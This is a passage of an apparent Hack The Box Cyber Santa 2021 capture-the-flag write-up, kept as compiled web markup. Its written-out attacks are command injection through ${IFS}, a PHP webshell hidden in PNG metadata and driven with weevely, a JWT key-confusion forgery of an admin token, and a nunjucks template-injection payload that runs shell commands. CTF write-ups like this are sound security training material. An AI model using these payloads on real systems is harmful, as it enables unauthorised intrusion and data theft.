@rsi\nHTB{upx_41nt_50_h4rd!!}\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\\xf3\n")),(0,r.kt)("p",null,"This method is more complex but would be handful if the obfuscation was\nharder than a XOR or if that ",(0,r.kt)("inlineCode",{parentName:"p"},"obj.CHECK")," couldn't be read directly."),(0,r.kt)("h3",{id:"sleigh---pwn"},"Sleigh - Pwn"),(0,r.kt)("p",null,"I didn't do it."),(0,r.kt)("h2",{id:"day-3---03122021"},"Day 3 - 03/12/2021"),(0,r.kt)("h3",{id:"gadget-santa---web"},"Gadget Santa - Web"),(0,r.kt)("h4",{id:"source-code-review"},"Source code review"),(0,r.kt)("p",null,"On the web app home page we can run command through get parameters like that\n",(0,r.kt)("a",{parentName:"p",href:"http://178.128.35.132:30784/?command=ups_status"},"http://178.128.35.132:30784/?command=ups_status"),"."),(0,r.kt)("p",null,"The command is received like that by the controller\nin ",(0,r.kt)("inlineCode",{parentName:"p"},"challenge/controllers/MonitorController.php")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-php"},"<?php\nclass MonitorController\n{\n    public function index($router)\n    {\n        $command = isset($_GET['command']) ? $_GET['command'] : 'welcome';\n        $monitor = new MonitorModel($command);\n        return $router->view('index', ['output' => $monitor->getOutput()]);\n    }\n}\n")),(0,r.kt)("p",null,"The received command is used to build a model (",(0,r.kt)("inlineCode",{parentName:"p"},"challenge/models/MonitorModel.php"),")"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-php"},"<?php\nclass MonitorModel\n{\n    public function __construct($command)\n    {\n        $this->command = $this->sanitize($command);\n    }\n\n    public function sanitize($command)\n    {\n        $command = preg_replace('/\\s+/', '', $command);\n        return $command;\n    }\n\n    public function getOutput()\n    {\n        return shell_exec('/santa_mon.sh '.$this->command);\n    }\n}\n")),(0,r.kt)("p",null,"On init the model ",(0,r.kt)("inlineCode",{parentName:"p"},"MonitorModel")," wil call the function ",(0,r.kt)("inlineCode",{parentName:"p"},"sanitize()")," that\nremove all whitespaces. The when the view is rendered the function ",(0,r.kt)("inlineCode",{parentName:"p"},"getOutput()"),"\nis called and will execute the system script ",(0,r.kt)("inlineCode",{parentName:"p"},"santa_mon.sh")," where our command will\nbe passed as argument."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},'#!/bin/bash\n\nups_status() {\n    curl localhost:3000;\n}\n\nrestart_ups() {\n    curl localhost:3000/restart;\n}\n\nlist_processes() {\n    ps -ef\n}\n\nlist_ram() {\n    free -h\n}\n\nlist_connections() {\n    netstat -plnt\n}\n\nlist_storage() {\n    df -h\n}\n\nwelcome() {\n    echo "[+] Welcome to Santa\'s Monitor Gadget!"\n}\n\nif [ "$#" -gt 0 ]; then\n    $1\nfi\n')),(0,r.kt)("p",null,"But nothing prevent us to perform an RCE, we do not need whitespaces for that,\nfor example we can chain the commands:"),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"http://178.128.35.132:30784/?command=ups_status;id"},"http://178.128.35.132:30784/?command=ups_status;id")),(0,r.kt)("p",null,"output:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'{"status": "running"}uid=1000(www) gid=1000(www) groups=1000(www)\n')),(0,r.kt)("p",null,"Looking in ",(0,r.kt)("inlineCode",{parentName:"p"},"config/ups_manager.py")," we can see there is another web application\nrunning on localhost that is used to get the UPS status but this app has an\ninterresting route for us: ",(0,r.kt)("inlineCode",{parentName:"p"},"get_flag")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-python"},"def http_server(host_port,content_type=\"application/json\"):\n  class CustomHandler(SimpleHTTPRequestHandler):\n    def do_GET(self) -> None:\n      def resp_ok():\n        self.send_response(200)\n        self.send_header(\"Content-type\", content_type)\n        self.end_headers()\n      if self.path == '/':\n        resp_ok()\n        if check_service():\n          self.wfile.write(get_json({'status': 'running'}))\n        else:\n          self.wfile.write(get_json({'status': 'not running'}))\n        return\n      elif self.path == '/restart':\n        restart_service()\n        resp_ok()\n        self.wfile.write(get_json({'status': 'service restarted successfully'}))\n        return\n      elif self.path == '/get_flag':\n        resp_ok()\n        self.wfile.write(get_json({'status': 'HTB{f4k3_fl4g_f0r_t3st1ng}'}))\n        return\n      self.send_error(404, '404 not found')\n    def log_message(self, format, *args):\n      pass\n  class _TCPServer(TCPServer):\n    allow_reuse_address = True\n  httpd = _TCPServer(host_port, CustomHandler)\n  httpd.serve_forever()\n")),(0,r.kt)("p",null,"But we cant just run ",(0,r.kt)("a",{parentName:"p",href:"http://178.128.35.132:30784/?command=ups_status;curl%20localhost:3000/get_flag"},"http://178.128.35.132:30784/?command=ups_status;curl%20localhost:3000/get_flag"),"\nlike that because the whitespace will be removed by the sanitize function."),(0,r.kt)("h4",{id:"exploitation-security-bypass"},"Exploitation: security bypass"),(0,r.kt)("p",null,"To bypass the sanitize function we'll use IFS - Internal field separator."),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"http://178.128.35.132:30784/?command=ups_status;curl$%7BIFS%7Dlocalhost:3000/get_flag"},"http://178.128.35.132:30784/?command=ups_status;curl${IFS}localhost:3000/get_flag")),(0,r.kt)("p",null,"output:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'{"status": "running"}{"status": "HTB{54nt4_i5_th3_r34l_r3d_t34m3r}"}\n')),(0,r.kt)("h3",{id:"naughty-list---pwn"},"Naughty List - Pwn"),(0,r.kt)("p",null,"I didn't do it."),(0,r.kt)("h3",{id:"missing-reindeer---crypto"},"Missing Reindeer - Crypto"),(0,r.kt)("p",null,"I didn't do it."),(0,r.kt)("h3",{id:"intercept---reversing"},"Intercept - Reversing"),(0,r.kt)("p",null,"I didn't do it."),(0,r.kt)("h3",{id:"persist---forensics"},"Persist - Forensics"),(0,r.kt)("p",null,"I didn't do it."),(0,r.kt)("h2",{id:"day-4---04122021"},"Day 4 - 04/12/2021"),(0,r.kt)("h3",{id:"elf-directory---web"},"Elf Directory - Web"),(0,r.kt)("h4",{id:"cookie-manipulation"},"Cookie manipulation"),(0,r.kt)("p",null,"For this challenge we do not have the source code."),(0,r.kt)("p",null,"We can register an account, log in, and see our pofile on read-only mode with\nthe following message:"),(0,r.kt)("blockquote",null,(0,r.kt)("p",{parentName:"blockquote"},"You don't have permission to edit your profile, contact the admin elf to approve your account!")),(0,r.kt)("p",null,"We have no way to contat the admin for now."),(0,r.kt)("p",null,"I used ",(0,r.kt)("a",{parentName:"p",href:"https://github.com/cyfun/ctf-party"},"ctf-party")," to decode and re-encode our cookie\ntrying to become an approved user."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'$ ctf-party \'eyJ1c2VybmFtZSI6Im5vcmFqIiwiYXBwcm92ZWQiOmZhbHNlfQ%3D%3D\' urldecode from_b64\n{"username":"cyfun","approved":false}\n$ ctf-party \'{"username":"cyfun","approved":true}\' to_b64 urlencode\neyJ1c2VybmFtZSI6Im5vcmFqIiwiYXBwcm92ZWQiOnRydWV9\n')),(0,r.kt)("p",null,"It works, we now are able to modify our profile."),(0,r.kt)("h4",{id:"upload"},"Upload"),(0,r.kt)("p",null,"We can't upload a webshell even when modifying the extention + content type + adding\nthe PNG magic bytes."),(0,r.kt)("p",null,"So let's upload some legit PNG files to find the upload path and see if the files\nare renamed after upload. Maybe our webshell was not removed even if we received\nan error for invalid files."),(0,r.kt)("p",null,"I uploaded two times the same image that was partially renamed:"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("a",{parentName:"li",href:"http://178.62.75.187:31547/uploads/87ed6_Flag_of_France.png"},"http://178.62.75.187:31547/uploads/87ed6_Flag_of_France.png")),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("a",{parentName:"li",href:"http://178.62.75.187:31547/uploads/c7b03_Flag_of_France.png"},"http://178.62.75.187:31547/uploads/c7b03_Flag_of_France.png"))),(0,r.kt)("p",null,"So 5 random hexadecimal characters were prepended, we can bruteforce to see if our webshell\nis present on the web server or not."),(0,r.kt)("p",null,"I tried the about 1M possibilities but it seems invalid files are removed\nand there are too much possibilities to perform a race condition."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ cook hex:hex:hex:hex:hex:_agent.php -config-path /usr/share/cook/cook.yaml | ffuf -u http://178.62.75.187:31547/uploads/FUZZ -w -\n")),(0,r.kt)("p",null,"So I though about using the same technique as during\n",(0,r.kt)("a",{parentName:"p",href:"https://blog.raw.pm/en/ECSC-2019-Quals-write-ups/#302-Ceci-n-est-pas-une-pipe-Web"},"ECSC 2019 Quals Team France"),":\nembedding a webshell in exif metadata:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ exiftool -documentname=\"$(cat agent.php| tr '\\n' ' ')\" cyfun.png\n")),(0,r.kt)("p",null,"I have a hidden webshell at ",(0,r.kt)("a",{parentName:"p",href:"http://178.62.75.187:31547/uploads/2e5ea_cyfun.png.php"},"http://178.62.75.187:31547/uploads/2e5ea_cyfun.png.php")),(0,r.kt)("p",null,"RCE successful:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ weevely http://178.62.75.187:31547/uploads/2e5ea_cyfun.png.php cyfun\n\n[+] weevely 4.0.1\n\n[+] Target:     178.62.75.187:31547\n[+] Session:    /home/cyfun/.weevely/sessions/178.62.75.187/2e5ea_cyfun.png_0.session\n\n[+] Browse the filesystem or execute commands starts the connection\n[+] to the target. Type :help for more information.\n\nweevely> id\nuid=1000(www) gid=1000(www) groups=1000(www)\nwebelfdirectory-1225-667cc6cfcd-772pc:/www/uploads $\n")),(0,r.kt)("p",null,"Grab the flag:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ webelfdirectory-1225-667cc6cfcd-772pc:/www/uploads $ cat /flag_65890d927c37c33.txt\nHTB{br4k3_au7hs_g3t_5h3lls}\n")),(0,r.kt)("h3",{id:"minimelfistic---pwn"},"Minimelfistic - Pwn"),(0,r.kt)("p",null,"I didn't do it."),(0,r.kt)("h3",{id:"meet-me-halfway---crytpo"},"Meet Me Halfway - Crytpo"),(0,r.kt)("p",null,"I didn't do it."),(0,r.kt)("h3",{id:"upgraded---reversing"},"Upgraded - Reversing"),(0,r.kt)("p",null,"I didn't do it."),(0,r.kt)("h3",{id:"giveaway---forensics"},"Giveaway - Forensics"),(0,r.kt)("p",null,"We have a to face a MS word document including macro ",(0,r.kt)("inlineCode",{parentName:"p"},".docm"),"."),(0,r.kt)("p",null,"We can extract the archive:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ 7z x christmas_giveaway.docm\n")),(0,r.kt)("p",null,"We can see ",(0,r.kt)("inlineCode",{parentName:"p"},"word/vbaData.xml")," which describe the macros and the macro\ncompiled as a binary itself ",(0,r.kt)("inlineCode",{parentName:"p"},"word/vbaProject.bin"),"."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-xml"},'<wne:mcds>\n  <wne:mcd wne:macroName="PROJECT.THISDOCUMENT.AUTO_OPEN" wne:name="Project.ThisDocument.Auto_Open" wne:bEncrypt="00" wne:cmg="56"/>\n  <wne:mcd wne:macroName="PROJECT.THISDOCUMENT.H" wne:name="Project.ThisDocument.h" wne:bEncrypt="00" wne:cmg="56"/>\n  <wne:mcd wne:macroName="PROJECT.THISDOCUMENT.AUTOOPEN" wne:name="Project.ThisDocument.AutoOpen" wne:bEncrypt="00" wne:cmg="56"/>\n  <wne:mcd wne:macroName="PROJECT.THISDOCUMENT.WORKBOOK_OPEN" wne:name="Project.ThisDocument.Workbook_Open" wne:bEncrypt="00" wne:cmg="56"/>\n  <wne:mcd wne:macroName="PROJECT.THISDOCUMENT.FINDTEST" wne:name="Project.ThisDocument.findTest" wne:bEncrypt="00" wne:cmg="56"/>\n  <wne:mcd wne:macroName="PROJECT.THISDOCUMENT.SECONDTEST" wne:name="Project.ThisDocument.secondTest" wne:bEncrypt="00" wne:cmg="56"/>\n</wne:mcds>\n')),(0,r.kt)("p",null,"We can decompile the macro with ",(0,r.kt)("inlineCode",{parentName:"p"},"pcode2code"),"."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ pcode2code christmas_giveaway.docm > macro.vbs\n")),(0,r.kt)("p",null,"The part of the code interesting us that we need to deobfuscate is the following."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-vbs"},'    Dim strFileURL, HPkXUcxLcAoMHOlj, cxPZSGdIQDAdRVpziKf, fqtSMHFlkYeyLfs, ehPsgfAcWaYrJm, FVpHoEqBKnhPO As String\n    \n    HPkXUcxLcAoMHOlj = "https://elvesfactory/" & Chr(Asc("H")) & Chr(84) & Chr(Asc("B")) & "" & Chr(123) & "" & Chr(84) & Chr(Asc("h")) & "1" & Chr(125 - 10) & Chr(Asc("_")) & "1s" & Chr(95) & "4"\n    cxPZSGdIQDAdRVpziKf = "_" & Replace("present", "e", "3") & Chr(85 + 10)\n    fqtSMHFlkYeyLfs = Replace("everybody", "e", "3")\n    fqtSMHFlkYeyLfs = Replace(fqtSMHFlkYeyLfs, "o", "0") & "_"\n    ehPsgfAcWaYrJm = Chr(Asc("w")) & "4" & Chr(110) & "t" & Chr(115) & "_" & Chr(Asc("f")) & "0" & Chr(121 - 7) & Chr(95)\n    FVpHoEqBKnhPO = Replace("christmas", "i", "1")\n    FVpHoEqBKnhPO = Replace(FVpHoEqBKnhPO, "a", "4") & Chr(119 + 6)\n')),(0,r.kt)("p",null,"Doing it manually gives us the flag."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"HTB{Th1s_1s_4_pr3s3nt_3v3ryb0dy_w4nts_f0r_chr1stm4s}\n")),(0,r.kt)("h2",{id:"day-5---05122021"},"Day 5 - 05/12/2021"),(0,r.kt)("h3",{id:"naughty-or-nice---web"},"Naughty or Nice - Web"),(0,r.kt)("p",null,"By reading the routes source code at ",(0,r.kt)("inlineCode",{parentName:"p"},"challenge/routes/index.js")," we understand most\nendpoints are retricted to user ",(0,r.kt)("inlineCode",{parentName:"p"},"admin"),"."),(0,r.kt)("p",null,"For exmaple:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-javascript"},"router.post('/api/elf/edit', AuthMiddleware, async (req, res) => {\n  return db.getUser(req.data.username)\n    .then(user => {\n      if(user.username != 'admin') return res.status(403).send(response('Access denied'));\n      const {elf_name, type, editelf_id} = req.body;\n      if (elf_name, type, editelf_id) {\n        if (type != 'nice' && type != 'naughty') return res.status(403).send(response('The type has to be either \"nice\" or \"naughty\"!'));\n        return db.editName(elf_name, type, editelf_id)\n          .then(() => res.send(response('Elf details updated successfully!')))\n          .catch(() => res.status(500).send(response('Something went wrong, please try again!')));\n      }\n      res.status(403).send(response('Missing required parameters, make sure to fill out all the fields!'));\n    })\n    .catch(() => res.status(500).send(response('Something went wrong!')));\n});\n")),(0,r.kt)("p",null,"To try to become admin I tried some SQL truncation on the username at registration\n(",(0,r.kt)("inlineCode",{parentName:"p"},"VARCHAR(255)"),") but it didn't work."),(0,r.kt)("p",null,"There is a JWT token, and either by decoding it or reading the source code\n",(0,r.kt)("inlineCode",{parentName:"p"},"challenge/helpers/JWTHelper.js")," we see the data section contains a public key,\nwhich is unusual."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'$ jwt-tool eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im5vcmFqIiwicGsiOiItLS0tLUJFR0lOIFBVQkxJQyBLRVktLS0tLVxuTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFzK1kwZ0lORVdlYkZML1N3R3lpR1xuOS9oSU91VGxYajNiTnM0U3dXRHhPc2V4WWN1NlBOUS9qZmZNQjYyZm9BclQxbTAwQ2V4QnVNWGRRRWxnemJ5NFxubjNYZkE0ZVNwdFlWMDlnTStuYXAxT2p4cDZWMjF1NUxjalJMZ2VycDZRcHBBZDFJMitMZzcxVXVaa25BUVBMYVxuUy9sZ1ZIbzVHTWMyWnVPQXVKUEQxYVErQ0N0ZGFOUy9qcWpnSVRRdEI1VkNrSjlTM0ltUkp3RHk0b2VxcG1rUlxuYnVydmRoSDZXVmtDVDc3TmthSnpudFFiNW9DOFBnODgvczFDTGk1S2JoQ0Ruam54T3R3ekQyNE5zQUhlRnlxWlxuSzRiby9WNXlPOGUyVXNCRjQzdWZxK09MeHRuWGgwMVZ2YnFVRnY2YWZ0ZDRzb1pGd3Y0SVpWOG5sOWdIb0tUK1xuWHdJREFRQUJcbi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLSIsImlhdCI6MTYzODcyNDIzNn0.qQKaGpRXCgSe3daQwKuJo-yp-seXnqpujsEa9923GeelrGwmLtT6DlG0lF5-HFMzhF6TSj0OQ4VUh_qvgK4xDLZGk-VKVPCn4b0YX5Vcf7-Sia5-G_hmZGnSny7CV9TwS3ceykDsaR3eDxcFFna19yVTJsrat8XRuWF5ywOhUrEAaY5Rg2GoL7jXuNHxMWO0QKwHPGbJ7IqN0zB5pmw_8PSXejJZMyWqISS5xYClirs9239GCvIIg5d1U86nibZxSaZrREOZDfZ0xsml7RdirNL17bJvNm8NlpjUKPslj4OZS3lVfiLaTaN1xkP4GINuvsDPFEbQLEu6s0CEhmAj-Q\n\nOriginal JWT:\n\n=====================\nDecoded Token Values:\n=====================\n\nToken header values:\n[+] alg = "RS256"\n[+] typ = "JWT"\n\nToken payload values:\n[+] username = "cyfun"\n[+] pk = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAs+Y0gINEWebFL/SwGyiG\n9/hIOuTlXj3bNs4SwWDxOsexYcu6PNQ/jffMB62foArT1m00CexBuMXdQElgzby4\nn3XfA4eSptYV09gM+nap1Ojxp6V21u5LcjRLgerp6QppAd1I2+Lg71UuZknAQPLa\nS/lgVHo5GMc2ZuOAuJPD1aQ+CCtdaNS/jqjgITQtB5VCkJ9S3ImRJwDy4oeqpmkR\nburvdhH6WVkCT77NkaJzntQb5oC8Pg88/s1CLi5KbhCDnjnxOtwzD24NsAHeFyqZ\nK4bo/V5yO8e2UsBF43ufq+OLxtnXh01VvbqUFv6aftd4soZFwv4IZV8nl9gHoKT+\nXwIDAQAB\n-----END PUBLIC KEY-----"\n[+] iat = 1638724236    ==> TIMESTAMP = 2021-12-05 18:10:36 (UTC)\n\n----------------------\nJWT common timestamps:\niat = IssuedAt\nexp = Expires\nnbf = NotBefore\n----------------------\n')),(0,r.kt)("p",null,"Having the public key corresponding to the private key used to sign the JWT token\ngave me the idea to tamper it and perform a key confusion attack to spoof the\nadmin identity."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ jwt-tool -pk cyfun.pem -I -pc username -pv admin -X k eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im5vcmFqIiwicGsiOiItLS0tLUJFR0lOIFBVQkxJQyBLRVktLS0tLVxuTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFzK1kwZ0lORVdlYkZML1N3R3lpR1xuOS9oSU91VGxYajNiTnM0U3dXRHhPc2V4WWN1NlBOUS9qZmZNQjYyZm9BclQxbTAwQ2V4QnVNWGRRRWxnemJ5NFxubjNYZkE0ZVNwdFlWMDlnTStuYXAxT2p4cDZWMjF1NUxjalJMZ2VycDZRcHBBZDFJMitMZzcxVXVaa25BUVBMYVxuUy9sZ1ZIbzVHTWMyWnVPQXVKUEQxYVErQ0N0ZGFOUy9qcWpnSVRRdEI1VkNrSjlTM0ltUkp3RHk0b2VxcG1rUlxuYnVydmRoSDZXVmtDVDc3TmthSnpudFFiNW9DOFBnODgvczFDTGk1S2JoQ0Ruam54T3R3ekQyNE5zQUhlRnlxWlxuSzRiby9WNXlPOGUyVXNCRjQzdWZxK09MeHRuWGgwMVZ2YnFVRnY2YWZ0ZDRzb1pGd3Y0SVpWOG5sOWdIb0tUK1xuWHdJREFRQUJcbi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLSIsImlhdCI6MTYzODcyNDIzNn0.qQKaGpRXCgSe3daQwKuJo-yp-seXnqpujsEa9923GeelrGwmLtT6DlG0lF5-HFMzhF6TSj0OQ4VUh_qvgK4xDLZGk-VKVPCn4b0YX5Vcf7-Sia5-G_hmZGnSny7CV9TwS3ceykDsaR3eDxcFFna19yVTJsrat8XRuWF5ywOhUrEAaY5Rg2GoL7jXuNHxMWO0QKwHPGbJ7IqN0zB5pmw_8PSXejJZMyWqISS5xYClirs9239GCvIIg5d1U86nibZxSaZrREOZDfZ0xsml7RdirNL17bJvNm8NlpjUKPslj4OZS3lVfiLaTaN1xkP4GINuvsDPFEbQLEu6s0CEhmAj-Q\n\nOriginal JWT:\n\nFile loaded: cyfun.pem\njwttool_401db23acc193bab2f34eeb0bef34322 - EXPLOIT: Key-Confusion attack (signing using the Public Key as the HMAC secret)\n(This will only be valid on unpatched implementations of JWT.)\n[+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGsiOiItLS0tLUJFR0lOIFBVQkxJQyBLRVktLS0tLVxuTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFzK1kwZ0lORVdlYkZML1N3R3lpR1xuOS9oSU91VGxYajNiTnM0U3dXRHhPc2V4WWN1NlBOUS9qZmZNQjYyZm9BclQxbTAwQ2V4QnVNWGRRRWxnemJ5NFxubjNYZkE0ZVNwdFlWMDlnTStuYXAxT2p4cDZWMjF1NUxjalJMZ2VycDZRcHBBZDFJMitMZzcxVXVaa25BUVBMYVxuUy9sZ1ZIbzVHTWMyWnVPQXVKUEQxYVErQ0N0ZGFOUy9qcWpnSVRRdEI1VkNrSjlTM0ltUkp3RHk0b2VxcG1rUlxuYnVydmRoSDZXVmtDVDc3TmthSnpudFFiNW9DOFBnODgvczFDTGk1S2JoQ0Ruam54T3R3ekQyNE5zQUhlRnlxWlxuSzRiby9WNXlPOGUyVXNCRjQzdWZxK09MeHRuWGgwMVZ2YnFVRnY2YWZ0ZDRzb1pGd3Y0SVpWOG5sOWdIb0tUK1xuWHdJREFRQUJcbi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLSIsImlhdCI6MTYzODcyNDIzNn0.vYaQurOdvoY9iUcBBsbrtVvjWuvY7bvcMhl-UbXpX9c\n")),(0,r.kt)("p",null,"Using the tampered cookie I can authenticate as admin. We have access to more\nfeatures but we still need to find a way to read a system file (",(0,r.kt)("inlineCode",{parentName:"p"},"/flag.txt"),"\nas seen in ",(0,r.kt)("inlineCode",{parentName:"p"},"Dockerfile"),")."),(0,r.kt)("p",null,"I took a look at dependencies and saw nothing obvious so it's time to use tools."),(0,r.kt)("p",null,"With ",(0,r.kt)("inlineCode",{parentName:"p"},"npm-check-updates")," I saw a few dependencies were outdated. So maybe one\nof them is vulnerable."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ ncu\nChecking /home/cyfun/CTF/HTB_Cyber_Santa_2021/Naughty_or_Nice/web_naughty_or_nice/challenge/package.json\n[====================] 7/7 100%\n\n cookie-parser  ^1.4.4  \u2192   ^1.4.6\n nunjucks       ^3.2.0  \u2192   ^3.2.3\n sqlite-async   ^1.1.1  \u2192   ^1.1.2\n nodemon        ^2.0.2  \u2192  ^2.0.15\n\nRun ncu -u to upgrade package.json\n")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"nunjucks")," is a templating engine so it's prone to RCE or LFI if it's vulnerable."),(0,r.kt)("p",null,"I check on Snyk vulnerability DB and found that this version was vulnerable to\na prototype pollution attack: ",(0,r.kt)("a",{parentName:"p",href:"https://security.snyk.io/vuln/SNYK-JS-NUNJUCKS-1079083"},"https://security.snyk.io/vuln/SNYK-JS-NUNJUCKS-1079083")),(0,r.kt)("p",null,"Here is the upstream vulnerability report: ",(0,r.kt)("a",{parentName:"p",href:"https://github.com/mozilla/nunjucks/issues/1331"},"https://github.com/mozilla/nunjucks/issues/1331")),(0,r.kt)("p",null,"Editing an elf name and replacing it's name by ",(0,r.kt)("inlineCode",{parentName:"p"},"{{ 7*7 }}")," (",(0,r.kt)("inlineCode",{parentName:"p"},"/api/elf/edit"),"),\nwe can then see on the main page using the vulnerable card helper the number 49,\nproving the SSTI. So it's different from the prototype polution but it put us\non the way to abuse the templating engine."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-javascript"},"router.get('/', (req, res) => {\n  return db.listNames()\n    .then(elfList => {\n      return CardHelper.generateCard(elfList)\n        .then(cardHTML => {\n          return res.send(cardHTML);\n        })\n        .catch(() => res.status(500).send(response('Something went wrong!')));\n    });\n});\n")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"challenge/helpers/CardHelper.js"),":"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-javascript"},"const nunjucks   = require('nunjucks');\n\nmodule.exports = {\n  async generateCard(elfList) {\n    return new Promise(async (resolve, reject) => {\n      try {\n        let NaughtyNames = NiceNames = '<br>';\n        for(elfData of elfList) {\n          if (elfData.type == 'naughty') {\n            NaughtyNames = `${NaughtyNames}\\n${elfData.elf_name}<br>`;\n          }\n          else if (elfData.type == 'nice') {\n            NiceNames = `${NiceNames}\\n${elfData.elf_name}<br>`;\n          }\n        }\n        card = `\n          {% extends \"card.html\" %}\n          {% block card %}\n          <div class=\"card\">\n            <div class=\"card-page cart-page-front\">\n              <div class=\"card-page cart-page-outside\"></div>\n              <div class=\"card-page cart-page-inside\">\n              <p><span class='nheader green'>Nice List</span>\n                ${NiceNames}\n              </p>\n              </div>\n            </div>\n            <div class=\"card-page cart-page-bottom\">\n              <p><span class='nheader red'>Naughty List</span>\n                ${NaughtyNames}\n              </p>\n            </div>\n          </div>\n          {% endblock %}\n        `;\n        resolve(nunjucks.renderString(card));\n      } catch(e) {\n        reject(e);\n      }\n    })\n  }\n};\n")),(0,r.kt)("p",null,"So let's find a valid RCE payload, I found one in a nuclei template:\n",(0,r.kt)("a",{parentName:"p",href:"https://github.com/geeknik/the-nuclei-templates/blob/main/node-nunjucks-ssti.yaml"},"https://github.com/geeknik/the-nuclei-templates/blob/main/node-nunjucks-ssti.yaml")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-js"},"{{ range.constructor(\"return global.process.mainModule.require('child_process').execSync('cat /flag.txt')\")() }}\n")),(0,r.kt)("p",null,"That gives us the flag ",(0,r.kt)("inlineCode",{parentName:"p"},"HTB{S4nt4_g0t_ninety9_pr0bl3ms_but_chr1stm4s_4in7_0n3}"),"."),(0,r.kt)("h3",{id:"music-notes---pwn"},"Music Notes - Pwn"),(0,r.kt)("p",null,"I didn't do it."),(0,r.kt)("h3",{id:"warehouse-maintenance---crypto"},"Warehouse Maintenance - Crypto"),(0,r.kt)("p",null,"I didn't do it."),(0,r.kt)("h3",{id:"bamboozled---reversing"},"Bamboozled - Reversing"),(0,r.kt)("p",null,"I didn't do it."),(0,r.kt)("h3",{id:"ho-ho-ho---forensics"},"Ho Ho Ho - Forensics"),(0,r.kt)("p",null,"I didn't do 